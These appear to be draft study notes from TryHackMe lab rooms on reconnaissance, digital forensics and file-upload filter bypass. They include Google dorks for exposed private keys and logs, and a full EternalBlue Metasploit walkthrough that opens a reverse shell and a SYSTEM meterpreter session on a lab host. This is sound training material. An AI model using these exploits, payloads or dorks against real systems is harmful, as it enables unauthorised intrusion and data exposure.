---
title: "skills"
categories:
  - 技术
  - 教程
tags: [Markdown, web]
draft: true
sidebar: false
outline: deep
---

# skills

## Search Skills


Every one of us has used an Internet search engine; however, not everyone has tried to harness the full power of an Internet search engine. Almost every Internet search engine allows you to carry out advanced searches. Consider the following examples:

- [Google](https://www.google.com/advanced_search)
- [Bing](https://support.microsoft.com/en-us/topic/advanced-search-options-b92e25f1-0085-4271-bdf9-14aaea720930)
- [DuckDuckGo](https://duckduckgo.com/duckduckgo-help-pages/results/syntax)

Let's consider the search operators supported by Google.

- **"exact phrase"**: Double quotes indicate that you are looking for pages with the exact word or phrase. For example, one might search for **"passive reconnaissance"** to get pages with this exact phrase.
- **site:**: This operator lets you specify the domain name to which you want to limit your search. For example, we can search for success stories on TryHackMe using **site:tryhackme.com success stories**.
- **-**: The minus sign allows you to omit search results that contain a particular word or phrase. For example, you might be interested in learning about the pyramids, but you don't want to view tourism websites; one approach is to search for **pyramids -tourism or -tourism pyramids**.
- **filetype:**: This search operator is indispensable for finding files instead of web pages. Some of the file types you can search for using Google are Portable Document Format (PDF), Microsoft Word Document (DOC), Microsoft Excel Spreadsheet (XLS), and Microsoft PowerPoint Presentation (PPT). For example, to find cyber security presentations, try searching for **filetype:ppt cyber security**.

`filetype:xls site:clinic.thmredteam.com`

You can check more advanced controls in various search engines in this advanced search operators list; however, the above provides a good starting point. Check your favourite search engine for the supported search operators.

Combining advanced Google searches with specific terms, documents containing sensitive information or vulnerable web servers can be found. Websites such as [Google Hacking Database](https://www.exploit-db.com/google-hacking-database) (GHDB) collect such search terms and are publicly available. Let's take a look at some of the GHDB queries to see if our client has any confidential information exposed via search engines. GHDB contains queries under the following categories:

- Footholds
Consider [GHDB-ID: 6364](https://www.exploit-db.com/ghdb/6364) as it uses the query `intitle:"index of" "nginx.log"` to discover Nginx logs and might reveal server misconfigurations that can be exploited.
- Files Containing Usernames
For example, [GHDB-ID: 7047](https://www.exploit-db.com/ghdb/7047) uses the search term `intitle:"index of" "contacts.txt"` to discover files that leak juicy information.
- Sensitive Directories
For example, consider [GHDB-ID: 6768](https://www.exploit-db.com/ghdb/6768), which uses the search term `inurl:/certs/server.key` to find out if a private RSA key is exposed.
- Web Server Detection
Consider [GHDB-ID: 6876](https://www.exploit-db.com/ghdb/6876), which detects GlassFish Server information using the query `intitle:"GlassFish Server - Server Running"`.
- Vulnerable Files
For example, we can try to locate PHP files using the query `intitle:"index of" "*.php"`, as provided by [GHDB-ID: 7786](https://www.exploit-db.com/ghdb/7786).
- Vulnerable Servers
For instance, to discover SolarWinds Orion web consoles, [GHDB-ID: 6728](https://www.exploit-db.com/ghdb/6728) uses the query `intext:"user name" intext:"orion core" -solarwinds.com`.
- Error Messages
Plenty of useful information can be extracted from error messages. One example is [GHDB-ID: 5963](https://www.exploit-db.com/ghdb/5963), which uses the query `intitle:"index of" errors.log` to find log files related to errors.

You might need to adapt these Google queries to fit your needs as the queries will return results from all web servers that fit the criteria and were indexed. To avoid legal issues, it is best to refrain from accessing any files outside the scope of your legal agreement.

### Specialized Search Engines

<span style="font-size: 23px;">**WHOIS and DNS Related**</span>

Beyond the standard WHOIS and DNS query tools, there are third parties that offer paid services for historical WHOIS data. One example is WHOIS history, which provides a history of WHOIS data and can come in handy if the domain registrant didn’t use WHOIS privacy when they registered the domain.

There are a handful of websites that offer advanced DNS services that are free to use. Some of these websites offer rich functionality and could have a complete room dedicated to exploring one domain. For now, we'll focus on key DNS related aspects. We will consider the following:

- [ViewDNS.info](https://viewdns.info/)
- [Threat Intelligence Platform](https://threatintelligenceplatform.com/)

<span style="font-size: 23px;">**ViewDNS.info**</span>

[ViewDNS.info](https://viewdns.info/) offers Reverse IP Lookup. Initially, each web server would use one or more IP addresses; however, today, it is common to come across shared hosting servers. With shared hosting, one IP address is shared among many different web servers with different domain names. With reverse IP lookup, starting from a domain name or an IP address, you can find the other domain names using a specific IP address(es).

We can used reverse IP lookup to find other servers sharing the same IP addresses used by `cafe.thmredteam.com`. Therefore, it is important to note that knowing the IP address does not necessarily lead to a single website.

<span style="font-size: 23px;">**Threat Intelligence Platform**</span>

[Threat Intelligence Platform](https://threatintelligenceplatform.com/) requires you to provide a domain name or an IP address, and it will launch a series of tests from malware checks to WHOIS and DNS queries. The WHOIS and DNS results are similar to the results we would get using `whois` and `dig`, but Threat Intelligence Platform presents them in a more readable and visually appealing way. There is extra information that we get with our report. For instance, after we look up `thmredteam`.com, we see that Name Server (NS) records were resolved to their respective IPv4 and IPv6 addresses.

On the other hand, when we searched for `cafe.thmredteam.com`, we could also get a list of other domains on the same IP address. The result we see in the figure below is similar to the results we obtained using ViewDNS.info.

<span style="font-size: 23px;">**Specialized Search Engines**</span>

<span style="font-size: 23px;">**Shodon**</span>

[Shodan](https://www.shodan.io/) is a search engine for devices connected to the Internet. It allows you to search for specific types and versions of servers, networking equipment, industrial control systems, and IoT devices. You may want to see how many servers are still running Apache 2.4.1 and the distribution across countries. To find the answer, we can search for **apache 2.4.1**, which will return the list of servers with the string “apache 2.4.1” in their headers.

Consider visiting Shodan [Search Query Examples](https://www.shodan.io/search/examples) for more examples. Furthermore, you can check [Shodan trends](https://trends.shodan.io/) for historical insights if you have a subscription.

To use Shodan from the command-line properly, you need to create an account with Shodan, then configure shodan to use your API key using the command, `shodan init API_KEY`.

You can use different filters depending on the [type of your Shodan account](https://account.shodan.io/billing). To learn more about what you can do with `shodan`, we suggest that you check out [Shodan CLI](https://cli.shodan.io/). Let’s demonstrate a simple example of looking up information about one of the IP addresses we got from `nslookup cafe.thmredteam.com`. Using `shodan host IP_ADDRESS`, we can get the geographical location of the IP address and the open ports, as shown below.

```bash
pentester@TryHackMe$ shodan host 172.67.212.249

172.67.212.249
City:                    San Francisco
Country:                 United States
Organisation:            Cloudflare, Inc.
Updated:                 2021-11-22T05:55:54.787113
Number of open ports:    5

Ports:
     80/tcp  
    443/tcp  
	|-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3
   2086/tcp  
   2087/tcp  
   8080/tcp 
```

<span style="font-size: 23px;">**Censys**</span>

At first glance, [Censys](https://search.censys.io/) appears similar to Shodan. However, Shodan focuses on Internet-connected devices and systems, such as servers, routers, webcams, and IoT devices. Censys, on the other hand, focuses on Internet-connected hosts, websites, certificates, and other Internet assets. Some of its use cases include enumerating domains in use, auditing open ports and services, and discovering rogue assets within a network. You might want to check [Censys Search Use Cases](https://support.censys.io/hc/en-us/articles/20720064229140-Censys-Search-Use-Cases).

<span style="font-size: 23px;">**VirusTotal**</span>

[VirusTotal](https://www.virustotal.com/gui/home/upload) is an online website that provides a virus-scanning service for files using multiple antivirus engines. It allows users to upload files or provide URLs to scan them against numerous antivirus engines and website scanners in a single operation. They can even input file hashes to check the results of previously uploaded files.


<span style="font-size: 23px;">**Have I Been Pwned**</span> 

[Have I Been Pwned](https://haveibeenpwned.com/) (HIBP) does one thing; it tells you if an email address has appeared in a leaked data breach. Finding one's email within leaked data indicates leaked private information and, more importantly, passwords. Many users use the same password across multiple platforms, if one platform is breached, their password on other platforms is also exposed. Indeed, passwords are usually stored in encrypted format; however, many passwords are not that complex and can be recovered using a variety of attacks.

### Vulnerabilities and Exploits

<span style="font-size: 23px;">**CVE**</span>

- Common Vulnerabilities and Exposures (CVE), this term is given to a publicly disclosed vulnerability

We can think of the Common Vulnerabilities and Exposures (CVE) program as a dictionary of vulnerabilities. It provides a standardized identifier for vulnerabilities and security issues in software and hardware products. Each vulnerability is assigned a CVE ID with a standardized format like **CVE-2024-29988**. This unique identifier (CVE ID) ensures that everyone from security researchers to vendors and IT professionals is referring to the same vulnerability, [CVE-2024-29988](https://nvd.nist.gov/vuln/detail/CVE-2024-29988) in this case.

The MITRE Corporation maintains the CVE system. For more information and to search for existing CVEs, visit the [CVE Program](https://www.cve.org/) website. Alternatively, visit the [National Vulnerability Database](https://nvd.nist.gov/) (NVD) website. The screenshot below shows CVE-2014-0160, also known as Heartbleed.

<span style="font-size: 23px;">**Exploit Database**</span>

There are many reasons why you would want to exploit a vulnerable application; one would be assessing a company's security as part of its red team. Needless to say, we should not try to exploit a vulnerable system unless we are given permission, usually via a legally binding agreement.

Now that we have permission to exploit a vulnerable system, we might need to find a working exploit code. One resource is the [Exploit Database](https://www.exploit-db.com/). The Exploit Database lists exploit codes from various authors; some of these exploit codes are tested and marked as verified.

[GitHub](https://github.com/), a web-based platform for software development, can contain many tools related to CVEs, along with proof-of-concept (PoC) and exploit codes. To demonstrate this idea, check the screenshot below of search results on GitHub that are related to the Heartbleed vulnerability.

### Technical Documentation

[Microsoft Windows](https://learn.microsoft.com) 

[Snort Official](https://www.snort.org/documents)

[Apache HTTP Server](https://httpd.apache.org/docs)

[Node.js](https://nodejs.org/docs/latest/api)

## Blue

Deploy & hack into a Windows machine, leveraging common misconfigurations issues

<span style="font-size: 23px;">**Q&A**</span>

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) 

```bash
root@ip-10-10-66-117:~# nmap -p 1-1000 -sV -sC --script vuln 10.10.74.246
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-23 14:40 BST
Nmap scan report for 10.10.74.246
Host is up (0.00051s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 02:D0:AC:88:B6:E5 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.16 seconds

```

`ms17-010`

Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

```bash
msf6 > search ms17-010 type:exploit

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

`exploit/windows/smb/ms17_010_eternalblue`

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.10.66.117:4444 
[*] 10.10.74.246:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.74.246:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.74.246:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.74.246:445 - The target is vulnerable.
[*] 10.10.74.246:445 - Connecting to target for exploitation.
[+] 10.10.74.246:445 - Connection established for exploitation.
[+] 10.10.74.246:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.74.246:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.74.246:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.74.246:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.74.246:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.74.246:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.74.246:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.74.246:445 - Sending all but last fragment of exploit packet
[*] 10.10.74.246:445 - Starting non-paged pool grooming
[+] 10.10.74.246:445 - Sending SMBv2 buffers
[+] 10.10.74.246:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.74.246:445 - Sending final SMBv2 buffers.
[*] 10.10.74.246:445 - Sending last fragment of exploit packet!
[*] 10.10.74.246:445 - Receiving response from exploit packet
[+] 10.10.74.246:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.74.246:445 - Sending egg to corrupted connection.
[*] 10.10.74.246:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.74.246
[*] Command shell session 1 opened (10.10.66.117:4444 -> 10.10.74.246:49210) at 2025-05-23 15:03:55 +0100
[+] 10.10.74.246:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.74.246:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.74.246:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>^Z
Background session 1? [y/N]  y

```

Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0

```
`post/multi/manage/shell_to_meterpreter`


```bash
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                                               Connection
  --  ----  ----               -----------                                               ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.10.66.117:4444 -> 10.10.74.246:49210 (10.10.74.246)

msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1

msf6 post(multi/manage/shell_to_meterpreter) > exploit
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.66.117:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.74.246
[*] Meterpreter session 2 opened (10.10.66.117:4433 -> 10.10.74.246:49231) at 2025-05-23 15:20:04 +0100
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.10.66.117:4444 -> 10.10.74.246:49210 (10.10.74.246)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.10.66.117:4433 -> 10.10.74.246:49231 (10.10.74.246)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > shell
Process 1596 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system


```

## Digital Forensics

Q&A

Using pdfinfo, find out the author of the attached PDF file, ransom-letter.pdf.

```bash
root@ip-10-10-27-80:~/Rooms/introdigitalforensics# ls
letter-image.jpg  ransom-letter.doc  ransom-letter.pdf  ransom-lettter-2.zip
root@ip-10-10-27-80:~/Rooms/introdigitalforensics# pdfinfo ransom-letter.pdf 
Title:          Pay NOW
Subject:        We Have Gato
Author:         Ann Gree Shepherd
Creator:        Microsoft® Word 2016
Producer:       Microsoft® Word 2016
CreationDate:   Wed Feb 23 09:10:36 2022 GMT
ModDate:        Wed Feb 23 09:10:36 2022 GMT
Tagged:         yes
UserProperties: no
Suspects:       no
Form:           none
JavaScript:     no
Pages:          1
Encrypted:      no
Page size:      595.44 x 842.04 pts (A4)
Page rot:       0
File size:      71371 bytes
Optimized:      no
PDF version:    1.7
```

Using exiftool or any similar tool, try to find where the kidnappers took the image they attached to their document. What is the name of the street?

```bash
root@ip-10-10-27-80:~/Rooms/introdigitalforensics# exiftool letter-image.jpg
ExifTool Version Number         : 11.88
File Name                       : letter-image.jpg
Directory                       : .
File Size                       : 124 kB
...
Camera Model Name               : Canon EOS R6
...
GPS Position                    : 51 deg 30' 51.90" N, 0 deg 5' 38.73" W
...
```

search on [google maps](https://www.google.com/maps) or [micosoft maps](https://www.bing.com/maps)

postion: `51°30'51.9"N 0°05'38.7"W` Milk Street

---

## Bypassing  Filtering

We'll look at this as a step-by-step process. Let's say that we've been given a website to perform a security audit on.

1. The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as `server` or `x-powered-by` can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.
2. Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.
3. We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we can base further testing on.
   - An important Gobuster switch here is the `-x` switch, which can be used to look for files with specific extensions. For example, if you added `-x php,txt,html` to your Gobuster command, the tool would append `.php`, `.txt`, and `.html` to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
4. Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.

Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:

- If you can successfully upload a file with a totally invalid file extension (e.g. `testingimage.invalidfileextension`) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.
- Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.
- As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.
- Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.

### tips

[Magic Number validation](../common.md#magic-number-validation)

[list of file signatures on Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)

[php-reverse-shell](../files/phpfile.md#php-reverse-shell)

[example video](https://www.youtube.com/watch?v=8UPXibv_s1A) 